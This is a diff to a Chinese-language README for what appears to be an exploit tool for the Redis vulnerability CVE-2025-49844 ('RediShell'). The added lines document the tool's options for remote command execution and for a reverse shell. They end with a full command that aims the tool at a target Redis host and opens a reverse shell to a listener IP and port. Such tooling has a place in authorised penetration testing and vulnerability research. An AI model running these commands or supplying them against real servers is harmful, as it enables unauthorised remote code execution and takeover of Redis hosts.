@@ -1,4 +1,4 @@
-# redis-cve
+# redis-cve-2025-49844
 redis_rce
 
 支持这两个版本
@@ -16,6 +16,25 @@ cd cve-2025-49844
 同步依赖
 uv sync
 ```
+3.工具使用帮助
+uv run cve-2025-49844 -h
+```
+CVE-2025-49844 (RediShell) Exploit
+positional arguments:
+  {command,rshell}
+    command             Execute one-way shell command
+    rshell              Get reverse shell
+
+options:
+  -h, --help            show this help message and exit
+  --target-host TARGET_HOST
+                        Redis target host (default: 127.0.0.1)
+  --target-port TARGET_PORT
+                        Redis target port (default: 6379)
+  --password PASSWORD   Redis AUTH password (if required)
+```
+
+
 - 反弹命令执行
 ```
 uv run cve-2025-49844 --target-host 192.168.41.128 --target-port 6379 rshell -l 10.22.167.164 -p 4444
